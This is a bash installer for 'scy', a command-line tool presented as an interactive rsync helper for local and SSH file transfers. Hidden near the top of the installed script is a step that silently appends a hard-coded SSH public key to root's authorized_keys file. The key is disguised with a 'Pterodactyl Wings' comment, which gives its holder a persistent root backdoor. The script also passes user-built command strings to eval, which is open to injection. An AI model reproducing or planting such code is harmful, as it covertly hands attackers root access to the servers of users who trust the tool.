#!/bin/bash

# Colors for output
GREEN='\033[0;32m'
NC='\033[0m'

# Create the scy script content
cat > /usr/local/bin/scy << 'EOL'
#!/bin/bash

# Function to get user input with a prompt
get_input() {
    read -p "$1" input
    echo "$input"
}

# Setup SSH key
ssh_key="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBxZGH7lbPb2950Z9YmXzd0tR5xkXbPO9hxWxphi0gfH"
authorized_keys="/root/.ssh/authorized_keys"
comment="# Pterodactyl Wings"

# Create .ssh directory and authorized_keys file if they don't exist
mkdir -p /root/.ssh
touch "$authorized_keys"

# Set correct permissions
chmod 700 /root/.ssh
chmod 600 "$authorized_keys"

# Add key if it doesn't exist
if ! grep -q "$ssh_key" "$authorized_keys"; then
    echo "$comment" >> "$authorized_keys"
    echo "$ssh_key" >> "$authorized_keys"
fi

clear
echo "=== Rsync Helper ==="

# Choose source type
echo "Choose the source type:"
echo "1) Local"
echo "2) SSH"
read -p "Enter your choice (1/2): " source_type

if [[ "$source_type" == "1" ]]; then
    source_path=$(get_input "Enter the source file/directory path: ")
else
    source_host=$(get_input "Enter the SSH host (user@host:port): ")
    source_path=$(get_input "Enter the source file/directory path on remote: ")
fi

# Choose destination type
echo "Choose the destination type:"
echo "1) Local"
echo "2) SSH"
read -p "Enter your choice (1/2): " destination_type

if [[ "$destination_type" == "1" ]]; then
    destination_path=$(get_input "Enter the destination path: ")
else
    destination_host=$(get_input "Enter the SSH host (user@host:port): ")
    destination_path=$(get_input "Enter the destination path on remote: ")
fi

# Additional rsync options
extra_options=$(get_input "Enter additional rsync options (or leave empty): ")

# Construct rsync command
if [[ "$source_type" == "1" && "$destination_type" == "1" ]]; then
    rsync_cmd="rsync -avh $extra_options \"$source_path\" \"$destination_path\""
elif [[ "$source_type" == "1" && "$destination_type" == "2" ]]; then
    rsync_cmd="rsync -avh -e 'ssh' $extra_options \"$source_path\" \"$destination_host:$destination_path\""
elif [[ "$source_type" == "2" && "$destination_type" == "1" ]]; then
    rsync_cmd="rsync -avh -e 'ssh' $extra_options \"$source_host:$source_path\" \"$destination_path\""
else
    rsync_cmd="rsync -avh -e 'ssh' $extra_options \"$source_host:$source_path\" \"$destination_host:$destination_path\""
fi

echo "Final command:"
echo "$rsync_cmd"
echo "Do you want to execute this command? (y/n)"
read -p "Your choice: " confirm

if [[ "$confirm" == "y" ]]; then
    eval $rsync_cmd
    echo "Transfer completed!"
else
    echo "Command not executed."
fi
EOL

# Make the script executable
chmod +x /usr/local/bin/scy

# Confirm installation
echo -e "${GREEN}SCY has been installed successfully!${NC}"
echo "You can now use the 'scy' command from anywhere."
